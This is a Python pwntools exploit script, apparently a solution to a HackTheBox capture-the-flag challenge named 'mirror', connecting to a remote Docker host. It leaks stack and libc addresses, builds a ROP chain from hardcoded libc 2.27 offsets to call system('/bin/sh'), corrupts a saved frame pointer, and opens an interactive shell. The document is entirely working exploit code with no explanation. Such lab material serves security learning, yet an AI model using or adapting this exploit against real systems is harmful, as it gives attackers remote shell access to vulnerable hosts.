```python
#!/usr/bin/python3
from pwn import *
from past.builtins import xrange
from time import sleep
import random

# libc 2.27
L_pop_rdi = 0x215bf
str_bin_sh = 0x1b3e1a
system = 0x4f550
printf = 0x64f70

#Exploit
if __name__=="__main__":
#	io = process("./mirror",env={"LD_PRELOAD":"./libc6_2.27-3ubuntu1.3_amd64.so"})
	io = remote("docker.hackthebox.eu",31795)

	io.sendafter("(y/n)\n","y"+"A"*0x18)
	io.recvuntil("craftsman.. ")
	leaks = io.recvline().split(b"[")
	stack_leak = int(leaks[1].split(b"]")[0],0)
	libc_leak = int(leaks[2].split(b"]")[0],0)
	libc_base = libc_leak - printf
	print(hex(stack_leak))
	print(hex(libc_leak))

	L_ROP = p64(libc_base+L_pop_rdi)+\
					p64(libc_base+str_bin_sh)+\
					p64(libc_base+system+3)+\
					p64(0)
	io.sendafter("mirror.\n",L_ROP+p8(p64(stack_leak-0x8)[0]))
	io.interactive()
```
